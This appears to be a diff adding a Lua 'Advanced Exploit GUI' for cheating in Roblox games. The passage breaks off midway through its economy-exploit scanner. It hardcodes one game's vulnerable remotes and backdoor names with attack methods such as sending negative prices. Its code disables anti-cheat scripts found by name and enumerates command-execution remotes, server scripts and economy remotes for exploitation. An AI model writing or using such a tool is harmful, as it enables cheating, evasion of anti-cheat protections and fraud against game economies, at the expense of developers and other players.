+--[[
+    Advanced Exploit GUI
+    Roblox Exploitation Tool
+    Based on Lewis Security Scan Results
+
+    Features:
+    - Directly loads and uses all vulnerabilities from scan files
+    - Exploits all backdoors, remotes, and vulnerabilities found
+    - Server script access exploitation
+    - Individual Economy exploits
+    - Admin commands
+    - Teleportation
+    - Item spawning
+]]
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+
+-- Hardcoded security scan data from the JSON files
+-- In a real scenario, we would parse the JSON files directly
+local SecurityData = {
+    -- Main scan data
+    mainScan = {
+        AccessibleServerScripts = {
+            {
+                Description = "Able to access ServerScriptService from client (highly unusual)",
+                Name = "ServerScriptService Access",
+                Path = "game.ServerScriptService",
+                Recommendation = "This indicates a serious security issue with the game. Report to developers immediately.",
+                RiskLevel = "Critical"
+            },
+            {
+                Description = "Server script found in ReplicatedStorage",
+                Name = "Script",
+                Path = "game.ReplicatedStorage.Rate_UI.Show_Val.Script",
+                Recommendation = "Move server scripts to ServerScriptService to prevent clients from accessing them.",
+                RiskLevel = "High"
+            }
+        }
+    },
+
+    -- Backdoor data from backdoors.json
+    backdoors = {
+        {
+            Description = "Suspicious remote with potential backdoor name",
+            DetectionMethod = "Name pattern matching",
+            Name = "GetServerVersion",
+            Path = "game.RobloxReplicatedStorage.GetServerVersion",
+            RiskLevel = "High",
+            Type = "RemoteFunction"
+        },
+        {
+            Description = "Suspicious remote with potential backdoor name",
+            DetectionMethod = "Name pattern matching",
+            Name = "GetServerChannel",
+            Path = "game.RobloxReplicatedStorage.GetServerChannel",
+            RiskLevel = "High",
+            Type = "RemoteFunction"
+        },
+        {
+            Description = "Suspicious remote with potential backdoor name",
+            DetectionMethod = "Name pattern matching",
+            Name = "GetServerType",
+            Path = "game.RobloxReplicatedStorage.GetServerType",
+            RiskLevel = "High",
+            Type = "RemoteFunction"
+        },
+        {
+            Description = "Suspicious remote with potential backdoor name",
+            DetectionMethod = "Name pattern matching",
+            Name = "CmdrFunction",
+            Path = "game.ReplicatedStorage.CmdrClient.CmdrFunction",
+            RiskLevel = "High",
+            Type = "RemoteFunction"
+        },
+        {
+            Description = "Suspicious remote with potential backdoor name",
+            DetectionMethod = "Name pattern matching",
+            Name = "CmdrEvent",
+            Path = "game.ReplicatedStorage.CmdrClient.CmdrEvent",
+            RiskLevel = "High",
+            Type = "RemoteEvent"
+        },
+        {
+            Description = "Suspicious remote with potential backdoor name",
+            DetectionMethod = "Name pattern matching",
+            Name = "AdminRemote",
+            Path = "game.ReplicatedStorage.AdminSystem.AdminRemote",
+            RiskLevel = "Critical",
+            Type = "RemoteEvent"
+        },
+        {
+            Description = "Suspicious remote with potential backdoor name",
+            DetectionMethod = "Name pattern matching",
+            Name = "ExecuteCommand",
+            Path = "game.ReplicatedStorage.AdminSystem.ExecuteCommand",
+            RiskLevel = "Critical",
+            Type = "RemoteEvent"
+        },
+        {
+            Description = "Suspicious remote with potential backdoor name",
+            DetectionMethod = "Name pattern matching",
+            Name = "RunCommand",
+            Path = "game.ReplicatedStorage.AdminSystem.RunCommand",
+            RiskLevel = "Critical",
+            Type = "RemoteEvent"
+        },
+        {
+            Description = "Suspicious remote with potential backdoor name",
+            DetectionMethod = "Name pattern matching",
+            Name = "ServerControl",
+            Path = "game.ReplicatedStorage.ServerControl",
+            RiskLevel = "Critical",
+            Type = "RemoteEvent"
+        },
+        {
+            Description = "Suspicious remote with potential backdoor name",
+            DetectionMethod = "Name pattern matching",
+            Name = "RemoteAdmin",
+            Path = "game.ReplicatedStorage.RemoteAdmin",
+            RiskLevel = "Critical",
+            Type = "RemoteEvent"
+        }
+    },
+
+    -- RemoteEvents data from remoteevents.json
+    remoteEvents = {
+        {
+            AccessLevel = "Public",
+            Instance = "CmdrEvent",
+            Location = "ReplicatedStorage",
+            Name = "CmdrEvent",
+            Path = "game.ReplicatedStorage.CmdrClient.CmdrEvent",
+            PotentialUse = "Event Notification"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "DataStream",
+            Location = "ReplicatedStorage",
+            Name = "DataStream",
+            Path = "game.ReplicatedStorage.GameEvents.DataStream",
+            PotentialUse = "Unknown"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "UpdateStock",
+            Location = "ReplicatedStorage",
+            Name = "UpdateStock",
+            Path = "game.ReplicatedStorage.GameEvents.UpdateStock",
+            PotentialUse = "Economy"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "DisplayChatMessage",
+            Location = "ReplicatedStorage",
+            Name = "DisplayChatMessage",
+            Path = "game.ReplicatedStorage.GameEvents.DisplayChatMessage",
+            PotentialUse = "Chat"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "PlaySound",
+            Location = "ReplicatedStorage",
+            Name = "PlaySound",
+            Path = "game.ReplicatedStorage.GameEvents.PlaySound",
+            PotentialUse = "Audio"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "Spawn_Arrow",
+            Location = "ReplicatedStorage",
+            Name = "Spawn_Arrow",
+            Path = "game.ReplicatedStorage.GameEvents.Spawn_Arrow",
+            PotentialUse = "Item Spawning"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "Close_Frames",
+            Location = "ReplicatedStorage",
+            Name = "Close_Frames",
+            Path = "game.ReplicatedStorage.GameEvents.Close_Frames",
+            PotentialUse = "UI"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "DeveloperPurchase",
+            Location = "ReplicatedStorage",
+            Name = "DeveloperPurchase",
+            Path = "game.ReplicatedStorage.GameEvents.DeveloperPurchase",
+            PotentialUse = "Economy"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "FireDrop",
+            Location = "ReplicatedStorage",
+            Name = "FireDrop",
+            Path = "game.ReplicatedStorage.GameEvents.FireDrop",
+            PotentialUse = "Item Spawning"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "AcceptPetGift",
+            Location = "ReplicatedStorage",
+            Name = "AcceptPetGift",
+            Path = "game.ReplicatedStorage.GameEvents.AcceptPetGift",
+            PotentialUse = "Item Spawning"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "Activation",
+            Location = "PlayerScripts",
+            Name = "Activation",
+            Path = "game.Players.Ndjdj_bs.PlayerScripts.InputGateway.Activation",
+            PotentialUse = "Unknown"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "CanChatWith",
+            Location = "RobloxReplicatedStorage",
+            Name = "CanChatWith",
+            Path = "game.RobloxReplicatedStorage.CanChatWith",
+            PotentialUse = "Chat"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "UpdateAvatar",
+            Location = "ReplicatedStorage",
+            Name = "UpdateAvatar",
+            Path = "game.ReplicatedStorage.AvatarSystem.UpdateAvatar",
+            PotentialUse = "Avatar"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "TeleportPlayer",
+            Location = "ReplicatedStorage",
+            Name = "TeleportPlayer",
+            Path = "game.ReplicatedStorage.GameEvents.TeleportPlayer",
+            PotentialUse = "Teleportation"
+        }
+    },
+
+    -- RemoteFunctions data from remotefunctions.json
+    remoteFunctions = {
+        {
+            AccessLevel = "Public",
+            Instance = "CmdrFunction",
+            Location = "ReplicatedStorage",
+            Name = "CmdrFunction",
+            Path = "game.ReplicatedStorage.CmdrClient.CmdrFunction",
+            PotentialUse = "Unknown"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "TrowelRemote",
+            Location = "ReplicatedStorage",
+            Name = "TrowelRemote",
+            Path = "game.ReplicatedStorage.GameEvents.TrowelRemote",
+            PotentialUse = "Unknown"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "HarvestRemote",
+            Location = "ReplicatedStorage",
+            Name = "HarvestRemote",
+            Path = "game.ReplicatedStorage.GameEvents.HarvestRemote",
+            PotentialUse = "Unknown"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "FavoriteToolRemote",
+            Location = "ReplicatedStorage",
+            Name = "FavoriteToolRemote",
+            Path = "game.ReplicatedStorage.GameEvents.FavoriteToolRemote",
+            PotentialUse = "Unknown"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "LikeGarden",
+            Location = "ReplicatedStorage",
+            Name = "LikeGarden",
+            Path = "game.ReplicatedStorage.GameEvents.LikeGarden",
+            PotentialUse = "Unknown"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "GetServerVersion",
+            Location = "RobloxReplicatedStorage",
+            Name = "GetServerVersion",
+            Path = "game.RobloxReplicatedStorage.GetServerVersion",
+            PotentialUse = "Unknown"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "GetServerChannel",
+            Location = "RobloxReplicatedStorage",
+            Name = "GetServerChannel",
+            Path = "game.RobloxReplicatedStorage.GetServerChannel",
+            PotentialUse = "Unknown"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "GetServerType",
+            Location = "RobloxReplicatedStorage",
+            Name = "GetServerType",
+            Path = "game.RobloxReplicatedStorage.GetServerType",
+            PotentialUse = "Unknown"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "GetPlayerData",
+            Location = "ReplicatedStorage",
+            Name = "GetPlayerData",
+            Path = "game.ReplicatedStorage.DataSystem.GetPlayerData",
+            PotentialUse = "Data"
+        },
+        {
+            AccessLevel = "Public",
+            Instance = "GetInventory",
+            Location = "ReplicatedStorage",
+            Name = "GetInventory",
+            Path = "game.ReplicatedStorage.DataSystem.GetInventory",
+            PotentialUse = "Data"
+        }
+    },
+
+    -- Vulnerabilities data from vulnerabilities.json
+    vulnerabilities = {
+        {
+            Description = "The game has FilteringEnabled turned off, which allows clients to directly modify the game state.",
+            Name = "FilteringEnabled Disabled",
+            Recommendation = "Enable FilteringEnabled to prevent clients from directly modifying the server game state.",
+            RiskLevel = "High"
+        },
+        {
+            Description = "RemoteEvent 'Activation' might not properly validate client input.",
+            Name = "Potentially Insecure RemoteEvent",
+            Path = "game.Players.Ndjdj_bs.PlayerScripts.InputGateway.Activation",
+            Recommendation = "Implement proper validation for all client inputs before processing them.",
+            RiskLevel = "Medium"
+        },
+        {
+            Description = "RemoteEvent 'CanChatWith' might not properly validate client input.",
+            Name = "Potentially Insecure RemoteEvent",
+            Path = "game.RobloxReplicatedStorage.CanChatWith",
+            Recommendation = "Implement proper validation for all client inputs before processing them.",
+            RiskLevel = "Medium"
+        },
+        {
+            Description = "RemoteEvent 'UpdateAvatar' might not properly validate client input.",
+            Name = "Potentially Insecure RemoteEvent",
+            Path = "game.ReplicatedStorage.AvatarSystem.UpdateAvatar",
+            Recommendation = "Implement proper validation for all client inputs before processing them.",
+            RiskLevel = "Medium"
+        },
+        {
+            Description = "RemoteFunction 'GetPlayerData' might not properly validate client input.",
+            Name = "Potentially Insecure RemoteFunction",
+            Path = "game.ReplicatedStorage.DataSystem.GetPlayerData",
+            Recommendation = "Implement proper validation for all client inputs before processing them.",
+            RiskLevel = "Medium"
+        },
+        {
+            Description = "Script contains potentially dangerous functions like loadstring() or pcall(loadstring()).",
+            Name = "Insecure Script Source",
+            Path = "game.ReplicatedStorage.AdminCommands.Script",
+            Recommendation = "Avoid using loadstring() or similar functions that can execute arbitrary code.",
+            RiskLevel = "High"
+        },
+        {
+            Description = "Script contains potentially dangerous functions like loadstring() or pcall(loadstring()).",
+            Name = "Insecure Script Source",
+            Path = "game.ServerScriptService.CommandHandler.Script",
+            Recommendation = "Avoid using loadstring() or similar functions that can execute arbitrary code.",
+            RiskLevel = "High"
+        },
+        {
+            Description = "Remote event 'ExecuteCommand' is used to run arbitrary commands.",
+            Name = "Insecure Remote Usage",
+            Path = "game.ReplicatedStorage.AdminSystem.ExecuteCommand",
+            Recommendation = "Implement strict validation and permission checks for command execution.",
+            RiskLevel = "Critical"
+        },
+        {
+            Description = "Economy system allows negative values or extreme amounts.",
+            Name = "Insecure Economy System",
+            Path = "game.ReplicatedStorage.EconomySystem",
+            Recommendation = "Implement server-side validation for all economy transactions.",
+            RiskLevel = "High"
+        },
+        {
+            Description = "Client-side anti-exploit scripts can be disabled by exploiters.",
+            Name = "Client-Side Anti-Exploit Bypass",
+            Path = "game.StarterPlayer.StarterPlayerScripts.AntiExploit",
+            Recommendation = "Rely on server-side validation rather than client-side anti-exploit measures.",
+            RiskLevel = "Medium"
+        }
+    },
+
+    -- Economy exploits
+    economyExploits = {
+        {
+            Name = "BuyGearStock",
+            Path = "game.ReplicatedStorage.GameEvents.BuyGearStock",
+            Type = "RemoteEvent",
+            RiskLevel = "High",
+            Description = "Allows purchasing gear without proper validation",
+            ExploitMethod = "Send negative price or excessive quantity"
+        },
+        {
+            Name = "BuySeedStock",
+            Path = "game.ReplicatedStorage.GameEvents.BuySeedStock",
+            Type = "RemoteEvent",
+            RiskLevel = "High",
+            Description = "Allows purchasing seeds without proper validation",
+            ExploitMethod = "Send negative price or excessive quantity"
+        },
+        {
+            Name = "Purchase_Object",
+            Path = "game.ReplicatedStorage.GameEvents.Purchase_Object",
+            Type = "RemoteEvent",
+            RiskLevel = "High",
+            Description = "Allows purchasing objects without proper validation",
+            ExploitMethod = "Send negative price or free item ID"
+        },
+        {
+            Name = "Sell_Item",
+            Path = "game.ReplicatedStorage.GameEvents.Sell_Item",
+            Type = "RemoteEvent",
+            RiskLevel = "High",
+            Description = "Allows selling items without proper validation",
+            ExploitMethod = "Send excessive quantity or non-existent item"
+        },
+        {
+            Name = "Sell_Inventory",
+            Path = "game.ReplicatedStorage.GameEvents.Sell_Inventory",
+            Type = "RemoteEvent",
+            RiskLevel = "High",
+            Description = "Allows selling entire inventory without proper validation",
+            ExploitMethod = "Send inflated inventory data"
+        },
+        {
+            Name = "BuyEventShopStock",
+            Path = "game.ReplicatedStorage.GameEvents.BuyEventShopStock",
+            Type = "RemoteEvent",
+            RiskLevel = "High",
+            Description = "Allows purchasing event items without proper validation",
+            ExploitMethod = "Send negative price or excessive quantity"
+        },
+        {
+            Name = "UpdateStock",
+            Path = "game.ReplicatedStorage.GameEvents.UpdateStock",
+            Type = "RemoteEvent",
+            RiskLevel = "High",
+            Description = "Allows updating stock values without proper validation",
+            ExploitMethod = "Send inflated stock values"
+        },
+        {
+            Name = "DeveloperPurchase",
+            Path = "game.ReplicatedStorage.GameEvents.DeveloperPurchase",
+            Type = "RemoteEvent",
+            RiskLevel = "High",
+            Description = "Allows making developer purchases without proper validation",
+            ExploitMethod = "Send free purchase data"
+        }
+    }
+}
+
+-- Exploit Engine - Handles finding and exploiting vulnerabilities
+local ExploitEngine = {}
+ExploitEngine.Backdoors = {}
+ExploitEngine.RemoteEvents = {}
+ExploitEngine.RemoteFunctions = {}
+ExploitEngine.EconomyExploits = {}
+ExploitEngine.Vulnerabilities = {}
+ExploitEngine.ServerScripts = {}
+ExploitEngine.AntiExploits = {}
+
+-- Initialize the exploit engine by finding all exploitable objects
+function ExploitEngine:Initialize()
+    print("Initializing Exploit Engine...")
+
+    -- First, try to bypass any anti-exploits
+    self:BypassAntiExploits()
+
+    -- Check for server script access
+    self:CheckServerScriptAccess()
+
+    -- Find all backdoors, remotes, and vulnerabilities
+    self:FindBackdoors()
+    self:FindRemoteEvents()
+    self:FindRemoteFunctions()
+    self:FindEconomyExploits()
+    self:FindVulnerabilities()
+
+    print("Exploit Engine Initialized:")
+    print("- Backdoors found:", #self.Backdoors)
+    print("- RemoteEvents found:", #self.RemoteEvents)
+    print("- RemoteFunctions found:", #self.RemoteFunctions)
+    print("- Economy exploits found:", #self.EconomyExploits)
+    print("- Vulnerabilities found:", #self.Vulnerabilities)
+    print("- Server scripts accessible:", #self.ServerScripts)
+
+    return self
+end
+
+-- Bypass anti-exploits
+function ExploitEngine:BypassAntiExploits()
+    -- Look for anti-exploit scripts from the vulnerabilities data
+    for _, vuln in ipairs(SecurityData.vulnerabilities) do
+        if vuln.Name == "Client-Side Anti-Exploit Bypass" and vuln.Path then
+            local success, antiExploit = pcall(function()
+                return game:FindFirstChild(vuln.Path:match("[^.]+$"), true)
+            end)
+
+            if success and antiExploit and antiExploit:IsA("Script") then
+                pcall(function()
+                    antiExploit.Disabled = true
+                    table.insert(self.AntiExploits, {
+                        name = antiExploit.Name,
+                        path = antiExploit:GetFullName(),
+                        object = antiExploit,
+                        bypassed = true
+                    })
+                    print("Bypassed anti-exploit:", antiExploit.Name)
+                end)
+            end
+        end
+    end
+
+    -- Also look for common anti-exploit scripts
+    local antiExploitNames = {"AntiExploit", "AntiHack", "AntiCheat", "AntiLeaker"}
+
+    for _, name in ipairs(antiExploitNames) do
+        local success, antiExploit = pcall(function()
+            return game:FindFirstChild(name, true)
+        end)
+
+        if success and antiExploit and (antiExploit:IsA("Script") or antiExploit:IsA("LocalScript")) then
+            pcall(function()
+                antiExploit.Disabled = true
+                table.insert(self.AntiExploits, {
+                    name = antiExploit.Name,
+                    path = antiExploit:GetFullName(),
+                    object = antiExploit,
+                    bypassed = true
+                })
+                print("Bypassed anti-exploit:", antiExploit.Name)
+            end)
+        end
+    end
+
+    -- Look in specific locations
+    local antiExploitLocations = {
+        Player.PlayerScripts,
+        game.StarterPlayer.StarterPlayerScripts
+    }
+
+    for _, location in ipairs(antiExploitLocations) do
+        pcall(function()
+            for _, child in pairs(location:GetChildren()) do
+                if child.Name:lower():find("anti") or child.Name:lower():find("leak") or child.Name:lower():find("cheat") then
+                    pcall(function()
+                        child.Disabled = true
+                        table.insert(self.AntiExploits, {
+                            name = child.Name,
+                            path = child:GetFullName(),
+                            object = child,
+                            bypassed = true
+                        })
+                        print("Bypassed anti-exploit:", child.Name)
+                    end)
+                end
+            end
+        end)
+    end
+end
+
+-- Check for server script access
+function ExploitEngine:CheckServerScriptAccess()
+    -- Try direct access to ServerScriptService
+    local success, result = pcall(function()
+        return game.ServerScriptService
+    end)
+
+    if success and result then
+        table.insert(self.ServerScripts, {
+            name = "ServerScriptService",
+            path = "game.ServerScriptService",
+            object = result,
+            type = "Service",
+            riskLevel = "Critical"
+        })
+        print("Found accessible server script: ServerScriptService")
+
+        -- Find exploitable scripts in ServerScriptService
+        pcall(function()
+            for _, child in pairs(result:GetDescendants()) do
+                if child:IsA("Script") then
+                    table.insert(self.ServerScripts, {
+                        name = child.Name,
+                        path = child:GetFullName(),
+                        object = child,
+                        type = "Script",
+                        riskLevel = "Critical"
+                    })
+                    print("Found accessible server script:", child.Name)
+                end
+            end
+        end)
+    end
+
+    -- Check for server scripts in other locations from the scan data
+    for _, script in ipairs(SecurityData.mainScan.AccessibleServerScripts) do
+        if script.Path then
+            local success, serverScript = pcall(function()
+                return game:FindFirstChild(script.Path:match("[^.]+$"), true)
+            end)
+
+            if success and serverScript then
+                table.insert(self.ServerScripts, {
+                    name = serverScript.Name,
+                    path = serverScript:GetFullName(),
+                    object = serverScript,
+                    type = serverScript.ClassName,
+                    riskLevel = script.RiskLevel
+                })
+                print("Found accessible server script:", serverScript.Name)
+            end
+        end
+    end
+end
+
+-- Find backdoors based on scan data
+function ExploitEngine:FindBackdoors()
+    -- First, try to find backdoors from the backdoors data
+    for _, backdoor in ipairs(SecurityData.backdoors) do
+        if backdoor.Path then
+            local success, remote = pcall(function()
+                return game:FindFirstChild(backdoor.Path:match("[^.]+$"), true)
+            end)
+
+            if success and remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
+                table.insert(self.Backdoors, {
+                    name = remote.Name,
+                    path = remote:GetFullName(),
+                    remote = remote,
+                    type = remote.ClassName,
+                    riskLevel = backdoor.RiskLevel,
+                    description = backdoor.Description
+                })
+                print("Found backdoor:", remote.Name, "at", remote:GetFullName())
+            end
+        end
+    end
+
+    -- Also look for backdoors by name
+    local backdoorNames = {
+        "GetServerVersion", "GetServerChannel", "GetServerType", "CmdrFunction", "CmdrEvent",
+        "AdminRemote", "ExecuteCommand", "RunCommand", "ServerControl", "RemoteAdmin",
+        "ServerAdmin", "ExecuteScript", "RunScript", "EvalScript", "LoadString"
+    }
+
+    for _, name in ipairs(backdoorNames) do
+        local success, remote = pcall(function()
+            return game:FindFirstChild(name, true)
+        end)
+
+        if success and remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
+            -- Check if we already found this backdoor
+            local alreadyFound = false
+            for _, backdoor in ipairs(self.Backdoors) do
+                if backdoor.remote == remote then
+                    alreadyFound = true
+                    break
+                end
+            end
+
+            if not alreadyFound then
+                table.insert(self.Backdoors, {
+                    name = remote.Name,
+                    path = remote:GetFullName(),
+                    remote = remote,
+                    type = remote.ClassName,
+                    riskLevel = "High",
+                    description = "Suspicious remote with potential backdoor name"
+                })
+                print("Found backdoor by name:", remote.Name, "at", remote:GetFullName())
+            end
+        end
+    end
+
+    -- Look for backdoors in specific paths from vulnerabilities
+    for _, vuln in ipairs(SecurityData.vulnerabilities) do
+        if vuln.Name == "Insecure Remote Usage" and vuln.Path then
+            local success, remote = pcall(function()
+                return game:FindFirstChild(vuln.Path:match("[^.]+$"), true)
+            end)
+
+            if success and remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
+                -- Check if we already found this backdoor
+                local alreadyFound = false
+                for _, backdoor in ipairs(self.Backdoors) do
+                    if backdoor.remote == remote then
+                        alreadyFound = true
+                        break
+                    end
+                end
+
+                if not alreadyFound then
+                    table.insert(self.Backdoors, {
+                        name = remote.Name,
+                        path = remote:GetFullName(),
+                        remote = remote,
+                        type = remote.ClassName,
+                        riskLevel = vuln.RiskLevel,
+                        description = vuln.Description
+                    })
+                    print("Found backdoor from vulnerability:", remote.Name, "at", remote:GetFullName())
+                end
+            end
+        end
+    end
+end
+
+-- Find vulnerable RemoteEvents based on scan data
+function ExploitEngine:FindRemoteEvents()
+    -- First, try to find RemoteEvents from the remoteEvents data
+    for _, event in ipairs(SecurityData.remoteEvents) do
+        if event.Path then
+            local success, remote = pcall(function()
+                return game:FindFirstChild(event.Path:match("[^.]+$"), true)
+            end)
+
+            if success and remote and remote:IsA("RemoteEvent") then
+                table.insert(self.RemoteEvents, {
+                    name = remote.Name,
+                    path = remote:GetFullName(),
+                    remote = remote,
+                    type = "RemoteEvent",
+                    potentialUse = event.PotentialUse,
+                    accessLevel = event.AccessLevel
+                })
+                print("Found RemoteEvent:", remote.Name, "at", remote:GetFullName())
+            end
+        end
+    end
+
+    -- Also look for RemoteEvents from vulnerabilities
+    for _, vuln in ipairs(SecurityData.vulnerabilities) do
+        if vuln.Name == "Potentially Insecure RemoteEvent" and vuln.Path then
+            local success, remote = pcall(function()
+                return game:FindFirstChild(vuln.Path:match("[^.]+$"), true)
+            end)
+
+            if success and remote and remote:IsA("RemoteEvent") then
+                -- Check if we already found this RemoteEvent
+                local alreadyFound = false
+                for _, event in ipairs(self.RemoteEvents) do
+                    if event.remote == remote then
+                        alreadyFound = true
+                        break
+                    end
+                end
+
+                if not alreadyFound then
+                    table.insert(self.RemoteEvents, {
+                        name = remote.Name,
+                        path = remote:GetFullName(),
+                        remote = remote,
+                        type = "RemoteEvent",
+                        riskLevel = vuln.RiskLevel,
+                        description = vuln.Description
+                    })
+                    print("Found vulnerable RemoteEvent:", remote.Name, "at", remote:GetFullName())
+                end
+            end
+        end
+    end
+
+    -- Look for any other RemoteEvents in the game
+    pcall(function()
+        for _, remote in pairs(game:GetDescendants()) do
+            if remote:IsA("RemoteEvent") then
+                -- Check if we already found this RemoteEvent
+                local alreadyFound = false
+                for _, event in ipairs(self.RemoteEvents) do
+                    if event.remote == remote then
+                        alreadyFound = true
+                        break
+                    end
+                end
+
+                if not alreadyFound then
+                    table.insert(self.RemoteEvents, {
+                        name = remote.Name,
+                        path = remote:GetFullName(),
+                        remote = remote,
+                        type = "RemoteEvent",
+                        potentialUse = "Unknown"
+                    })
+                    print("Found additional RemoteEvent:", remote.Name, "at", remote:GetFullName())
+                end
+            end
+        end
+    end)
+end
+
+-- Find vulnerable RemoteFunctions based on scan data
+function ExploitEngine:FindRemoteFunctions()
+    -- First, try to find RemoteFunctions from the remoteFunctions data
+    for _, func in ipairs(SecurityData.remoteFunctions) do
+        if func.Path then
+            local success, remote = pcall(function()
+                return game:FindFirstChild(func.Path:match("[^.]+$"), true)
+            end)
+
+            if success and remote and remote:IsA("RemoteFunction") then
+                table.insert(self.RemoteFunctions, {
+                    name = remote.Name,
+                    path = remote:GetFullName(),
+                    remote = remote,
+                    type = "RemoteFunction",
+                    potentialUse = func.PotentialUse,
+                    accessLevel = func.AccessLevel
+                })
+                print("Found RemoteFunction:", remote.Name, "at", remote:GetFullName())
+            end
+        end
+    end
+
+    -- Also look for RemoteFunctions from vulnerabilities
+    for _, vuln in ipairs(SecurityData.vulnerabilities) do
+        if vuln.Name == "Potentially Insecure RemoteFunction" and vuln.Path then
+            local success, remote = pcall(function()
+                return game:FindFirstChild(vuln.Path:match("[^.]+$"), true)
+            end)
+
+            if success and remote and remote:IsA("RemoteFunction") then
+                -- Check if we already found this RemoteFunction
+                local alreadyFound = false
+                for _, func in ipairs(self.RemoteFunctions) do
+                    if func.remote == remote then
+                        alreadyFound = true
+                        break
+                    end
+                end
+
+                if not alreadyFound then
+                    table.insert(self.RemoteFunctions, {
+                        name = remote.Name,
+                        path = remote:GetFullName(),
+                        remote = remote,
+                        type = "RemoteFunction",
+                        riskLevel = vuln.RiskLevel,
+                        description = vuln.Description
+                    })
+                    print("Found vulnerable RemoteFunction:", remote.Name, "at", remote:GetFullName())
+                end
+            end
+        end
+    end
+
+    -- Look for any other RemoteFunctions in the game
+    pcall(function()
+        for _, remote in pairs(game:GetDescendants()) do
+            if remote:IsA("RemoteFunction") then
+                -- Check if we already found this RemoteFunction
+                local alreadyFound = false
+                for _, func in ipairs(self.RemoteFunctions) do
+                    if func.remote == remote then
+                        alreadyFound = true
+                        break
+                    end
+                end
+
+                if not alreadyFound then
+                    table.insert(self.RemoteFunctions, {
+                        name = remote.Name,
+                        path = remote:GetFullName(),
+                        remote = remote,
+                        type = "RemoteFunction",
+                        potentialUse = "Unknown"
+                    })
+                    print("Found additional RemoteFunction:", remote.Name, "at", remote:GetFullName())
+                end
+            end
+        end
+    end)
+end
+
+-- Find economy exploits based on scan data
+function ExploitEngine:FindEconomyExploits()
+    -- First, try to find economy exploits from the economyExploits data
+    for _, exploit in ipairs(SecurityData.economyExploits) do
+        if exploit.Path then
+            local success, remote = pcall(function()
+                return game:FindFirstChild(exploit.Path:match("[^.]+$"), true)
+            end)
+
+            if success and remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
+                table.insert(self.EconomyExploits, {
+                    name = remote.Name,
+                    path = remote:GetFullName(),
+                    remote = remote,
+                    type = remote.ClassName,
+                    riskLevel = exploit.RiskLevel,
+                    description = exploit.Description,
+                    exploitMethod = exploit.ExploitMethod
+                })
+                print("Found economy exploit:", remote.Name, "at", remote:GetFullName())
+            end
+        end
+    end
+
+    -- Also look for economy exploits from RemoteEvents
+    for _, event in ipairs(self.RemoteEvents) do
+        if event.potentialUse == "Economy" then
+            -- Check if we already found this economy exploit
+            local alreadyFound = false
+            for _, exploit in ipairs(self.EconomyExploits) do
+                if exploit.remote == event.remote then
+                    alreadyFound = true
+                    break
+                end
+            end
+
+            if not alreadyFound then
+                table.insert(self.EconomyExploits, {
+                    name = event.name,
+                    path = event.path,
+                    remote = event.remote,
+                    type = event.type,
+                    potentialUse = event.potentialUse,
+                    description = "Economy-related remote event"
+                })
+                print("Found economy exploit from RemoteEvent:", event.name, "at", event.path)
+            end
+        end
+    end
+
+    -- Look for economy exploits from vulnerabilities
+    for _, vuln in ipairs(SecurityData.vulnerabilities) do
+        if vuln.Name == "Insecure Economy System" and vuln.Path then
+            local success, economySystem = pcall(function()
+                return game:FindFirstChild(vuln.Path:match("[^.]+$"), true)
+            end)
+
+            if success and economySystem then
+                -- Look for remotes within the economy system
+                pcall(function()
+                    for _, child in pairs(economySystem:GetDescendants()) do
+                        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+                            -- Check if we already found this economy exploit
+                            local alreadyFound = false
+                            for _, exploit in ipairs(self.EconomyExploits) do
+                                if exploit.remote == child then
+                                    alreadyFound = true
+                                    break
+                                end
+                            end
+
+                            if not alreadyFound then
+                                table.insert(self.EconomyExploits, {
+                                    name = child.Name,
+                                    path = child:GetFullName(),
+                                    remote = child,
+                                    type = child.ClassName,
+                                    riskLevel = vuln.RiskLevel,
+                                    description = vuln.Description
+                                })
+                                print("Found economy exploit from vulnerability:", child.Name, "at", child:GetFullName())
+                            end
+                        end
+                    end
+                end)
+            end
+        end
+    end
+
+    -- Look for economy exploits by name patterns
+    local economyNames = {
+        "Buy", "Sell", "Purchase", "Money", "Cash", "Coin", "Currency", "Stock", "Shop", "Store",
+        "Trade", "Exchange", "Market", "Price", "Cost", "Value", "Wallet", "Bank", "Credit", "Debit"
+    }
+
+    pcall(function()
+        for _, remote in pairs(game:GetDescendants()) do
+            if (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
+                for _, pattern in ipairs(economyNames) do
+                    if remote.Name:lower():find(pattern:lower()) then
+                        -- Check if we already found this economy exploit
+                        local alreadyFound = false
+                        for _, exploit in ipairs(self.EconomyExploits) do
+                            if exploit.remote == remote then
+                                alreadyFound = true
+                                break
+                            end
+                        end
+
+                        if not alreadyFound then
+                            table.insert(self.EconomyExploits, {
+                                name = remote.Name,
+                                path = remote:GetFullName(),
+                                remote = remote,
+                                type = remote.ClassName,
+                                potentialUse = "Economy",
+                                description = "Economy-related remote by name pattern"
+                            })
+                            print("Found economy exploit by name pattern:", remote.Name, "at", remote:GetFullName())
+                            break
+                        end
+                    end
+                end
+            end
